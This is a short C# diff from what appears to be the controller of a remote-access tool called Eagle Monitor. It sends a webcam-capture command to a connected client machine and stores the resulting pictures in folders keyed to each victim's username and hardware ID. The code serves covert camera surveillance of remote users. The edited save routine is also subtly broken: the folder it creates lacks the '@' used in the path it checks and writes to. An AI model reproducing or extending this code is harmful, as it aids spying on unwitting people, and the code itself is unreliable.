@@ -69,11 +69,11 @@ namespace Eagle_Monitor.Forms
                 this.HasToCapture = true;
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.WebCam;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;    
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.CAPTURE_CAMERA, webCamComboBox.SelectedIndex, quailitySiticoneTrackBar.Value };
+                D.DataReturn = new object[] { Shared.PacketType.CAPTURE_CAMERA, webCamComboBox.SelectedIndex, quailitySiticoneTrackBar.Value };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
             else 
@@ -87,13 +87,14 @@ namespace Eagle_Monitor.Forms
 
         private void saveWindowsButton_Click(object sender, EventArgs e)
         {
-            if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + this.ClientHWID + "\\" + "Pictures") == false)
-                System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + this.ClientHWID + "\\" + "Pictures");
+            Client C = Client.ClientDictionary[this.IP_Origin];
+            if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\" + "Pictures") == false)
+                System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\"+ Client.ClientDictionary[this.IP_Origin].Username + this.ClientHWID + "\\" + "Pictures");
 
             string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
             try
             {
-                System.IO.File.WriteAllBytes(Utilities.GPath + "\\Clients\\" + this.ClientHWID + "\\Pictures\\" + Date + ".jpeg", Utilities.ImageToBytes(Client.ClientDictionary[this.IP_Origin].webCamForm.camPictureBox.Image));
+                System.IO.File.WriteAllBytes(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[this.IP_Origin].Username + "@" + this.ClientHWID + "\\Pictures\\" + Date + ".jpeg", Utilities.ImageToBytes(Client.ClientDictionary[this.IP_Origin].webCamForm.camPictureBox.Image));
             }
             catch (Exception ex) { MessageBox.Show(ex.ToString()); }
         }
